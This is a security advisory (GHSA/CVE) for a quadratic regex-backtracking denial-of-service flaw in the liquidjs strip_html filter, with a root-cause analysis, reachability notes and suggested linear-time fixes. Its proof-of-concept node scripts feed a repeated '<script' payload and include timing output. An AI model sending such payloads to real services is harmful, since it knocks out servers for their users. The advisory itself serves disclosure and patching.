# [H] LiquidJS Vulnerable to ReDoS via Quadratic Backtracking in `strip_html` Filter Regex

## Summary
Severity: High
Advisory: GHSA-r7g9-xpmj-5fcq
CVE: CVE-2026-45617
CWE: CWE-1333
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-05-27
Source: https://github.com/advisories/GHSA-r7g9-xpmj-5fcq
Type: github-advisory

## Affected
- npm: `liquidjs` — affected >=0 <10.26.0

## Details
## Summary

The built-in `strip_html` filter in liquidjs uses a regex containing four lazy-quantified alternatives. When the input contains many `<script`, `<style`, or `<!--` opener tokens without matching closers, the V8 regex engine performs O(N²) backtracking, blocking the Node.js event loop. A single ~350 KB request (`'<script'.repeat(50000)`) stalls the process for ~10 seconds; cost grows quadratically with input size. The default `memoryLimit: Infinity` does not bound regex CPU, and even when configured `strip_html` only charges `str.length` to the limit — the regex itself runs unbounded.

## Details

The vulnerable filter is at `src/filters/html.ts:45-49`:

```ts
export function strip_html (this: FilterImpl, v: string) {
  const str = stringify(v)
  this.context.memoryLimit.use(str.length)
  return str.replace(/<script[\s\S]*?<\/script>|<style[\s\S]*?<\/style>|<.*?>|<!--[\s\S]*?-->/g, '')
}
```

The regex contains four lazy patterns:
1. `<script[\s\S]*?<\/script>`
2. `<style[\s\S]*?<\/style>`
3. `<.*?>`
4. `<!--[\s\S]*?-->`

For an input like `'<script'.repeat(N)`, the engine encounters N starting `<` positions. At each one it must lazily expand `[\s\S]*?` (and `.*?`) all the way to end-of-input searching for a closer that never appears, then fail and backtrack. Because each of the O(N) starts performs O(N) lazy-expansion work, total work is O(N²).

Reachability:
1. `strip_html` is a default-registered filter (exported from `src/filters/html.ts`, wired up via `src/filters/index.ts`), invocable from any template via `{{ x | strip_html }}`.
2. The filter calls `String.prototype.replace` with the vulnerable regex directly on the caller-supplied string, with no length cap and no timeout.
3. The default `memoryLimit` is `Infinity` (`src/liquid-options.ts:198`); the filter only charges `str.length` against memory (line 47), which does not bound CPU work for regex backtracking.

This is distinct from `GHSA-45rm-2893-5f49` (prototype property leak, CWE-200) and from any prior `replace`/`strip_html` issues — the mechanism here is regex backtracking CPU consumption on a different filter.

## PoC

Empirical scaling confirmed against a freshly built `liquidjs@10.25.7` bundle on Node 22 / Linux:

```bash
node -e "
const { Liquid } = require('liquidjs');
const e = new Liquid();
(async () => {
  for (const n of [1000, 2000, 4000, 8000, 16000]) {
    const payload = '<script'.repeat(n);
    const t0 = Date.now();
    await e.parseAndRender('{{ x | strip_html }}', { x: payload });
    console.log('n=' + n + ' inputLen=' + payload.length + ' ms=' + (Date.now() - t0));
  }
})();
"
```

Verified output:
```
n=1000  inputLen=7000   ms=5
n=2000  inputLen=14000  ms=12     (2.4x for 2x size)
n=4000  inputLen=28000  ms=46     (3.8x for 2x size)
n=8000  inputLen=56000  ms=187    (4.0x for 2x size)
n=16000 inputLen=112000 ms=737    (3.9x for 2x size)
```

A larger payload extrapolates straightforwardly:
```bash
node -e "
const { Liquid } = require('liquidjs');
const e = new Liquid();
(async () => {
  const payload = '<script'.repeat(50000);  // 350 KB
  const t0 = Date.now();
  await e.parseAndRender('{{ x | strip_html }}', { x: payload });
  console.log('elapsed ms:', Date.now() - t0);
})();
"
# elapsed ms: ~10000+ (Node single-threaded event loop fully blocked)
```

The same pathology applies to `<style` and `<!--` openers.

## Impact

- **Single-request DoS:** A 350 KB request body stalls the Node.js event loop for ~10 seconds; 700 KB takes ~40 s; 1.4 MB takes ~160 s. All other requests on the process queue behind the regex.
- **Trivial amplification:** Quadratic scaling means small attacker bandwidth produces large server CPU consumption. A handful of concurrent requests fully saturates the worker.
- **No authentication required:** The typical use case for `strip_html` is sanitizing untrusted input (comments, posts, profile bios, product descriptions). Any endpoint that renders user content through `strip_html` is exposed.
- **memoryLimit doesn't help:** Even applications that opt into `memoryLimit` are not protected, because (a) the regex CPU runs to completion before any output is produced, and (b) only `str.length` is charged, not the cost of the regex traversal.

## Recommended Fix

Replace the backtracking regex with an atomic / non-overlapping pattern, and/or perform a single linear pass.

Option 1 — anchor each alternative so lazy expansion fails fast on chunked content (no `[\s\S]*?` over the full tail):
```ts
return str.replace(
  /<script\b[^<]*(?:<(?!\/script>)[^<]*)*<\/script>|<style\b[^<]*(?:<(?!\/style>)[^<]*)*<\/style>|<!--[^-]*(?:-(?!->)[^-]*)*-->|<[^>]*>/g,
  ''
)
```
This unrolls each lazy quantifier so each `<` is visited at most a constant number of times overall — linear total work.

Option 2 — single-pass tokenizer in plain code; iterate over the string once, tracking whether you are inside `<script>`, `<style>`, comment, or generic tag, and emit nothing for those ranges.

Either fix should be combined with charging the regex output cost honestly to `memoryLimit` and (defensively) capping input length up front:
```ts
export function strip_html (this: FilterImpl, v: string) {
  const str = stringify(v)
  this.context.memoryLimit.use(str.length)
  // ... linear-time strip implementation here
}
```

## References
- https://github.com/harttle/liquidjs/security/advisories/GHSA-r7g9-xpmj-5fcq
- https://nvd.nist.gov/vuln/detail/CVE-2026-45617
- https://github.com/harttle/liquidjs/commit/3616a744b9abeb425c217b340a2397d46176afb8
- https://github.com/harttle/liquidjs
- https://github.com/harttle/liquidjs/releases/tag/v10.26.0
